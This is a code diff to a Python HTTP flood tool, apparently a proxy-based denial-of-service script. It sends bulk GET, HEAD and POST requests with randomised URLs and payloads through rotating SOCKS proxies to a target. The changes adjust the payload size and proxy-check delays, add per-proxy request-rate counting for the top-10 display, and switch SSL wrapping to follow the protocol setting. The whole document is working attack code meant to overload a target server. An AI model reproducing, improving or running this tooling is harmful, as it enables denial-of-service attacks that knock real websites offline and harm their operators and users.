@@ -165,7 +165,7 @@ def GenReqHeader(method):
 		user_agent = "User-Agent: " + getuseragent() + "\r\n"
 		accept = Choice(acceptall)
 		if mode2 != "y":# You can enable customize data
-			data = str(random._urandom(7))+"="+str(random._urandom(8))
+			data = str(random._urandom(16))
 		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
 		if cookies != "":
 			length += "Cookies: "+str(cookies)+"\r\n"
@@ -246,9 +246,9 @@ def CheckerOption():
 	if ans == "":
 		ans = "y"
 	if ans == "y":
-		ms = str(input("> Delay of socks(seconds, default=1):"))
+		ms = str(input("> Delay of socks(seconds, default=5):"))
 		if ms == "":
-			ms = int(1)
+			ms = int(5)
 		else :
 			try:
 				ms = int(ms)
@@ -272,8 +272,13 @@ def OutputToScreen(ind_rlock):
 		print("{:^70}".format("IP:PORT   <->   RPS    "))
 		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
 		ind_rlock.acquire()
-		top10 = sorted(ind_dict, key=ind_dict.get, reverse=True)
-		for num in range(10):
+		top_num = 0
+		top10= sorted(ind_dict, key=ind_dict.get, reverse=True)
+		if len(top10) > 10:
+			top_num = 10
+		else:
+			top_num = len(top10)
+		for num in range(top_num):
 			top = "none"
 			rps = 0
 			if len(ind_dict) != 0:
@@ -313,11 +318,14 @@ def cc(event,socks_type,ind_rlock):
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
-				for _ in range(multiple+1):
+				for n in range(multiple+1):
 					get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = get_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
+						ind_rlock.acquire()
+						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
+						ind_rlock.release()
 						proxy = Choice(proxies).strip().split(":")
 						break
 				s.close()
@@ -351,13 +359,16 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
-				for _ in range(multiple+1):
+				for n in range(multiple+1):
 					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
 					request = head_host + header
 					sent = s.send(str.encode(request))
 					if not sent:
+						ind_rlock.acquire()
+						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
+						ind_rlock.release()
 						proxy = Choice(proxies).strip().split(":")
-						break
+						break#   This part will jump to dirty fix
 				s.close()
 			except:
 				s.close()
@@ -382,13 +393,16 @@ def post(event,socks_type,ind_rlock):
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
 			s.connect((str(target), int(port)))
-			if str(port) == '443': # //AUTO Enable SSL MODE :)
+			if protocol == "https":
 				ctx = ssl.SSLContext()
 				s = ctx.wrap_socket(s,server_hostname=target)
 			try:
-				for _ in range(multiple+1):
+				for n in range(multiple+1):
 					sent = s.send(str.encode(request))
 					if not sent:
+						ind_rlock.acquire()
+						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
+						ind_rlock.release()
 						proxy = Choice(proxies).strip().split(":")
 						break
 				s.close()
@@ -479,7 +493,7 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
 		return
 	err = 0
 	while True:
-		if err == 3:
+		if err >= 3:
 			rlock.acquire()
 			proxies.remove(lines)
 			rlock.release()
@@ -641,7 +655,7 @@ def main():
 	if mode == "post":
 		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
 		if mode2 == "y":
-			data = open(input("> Input the file's path:").strip()).readlines()
+			data = open(str(input("> Input the file's path:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
 			data = ' '.join([str(txt) for txt in data])
 	choice2 = InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
 	if choice2 == "y":
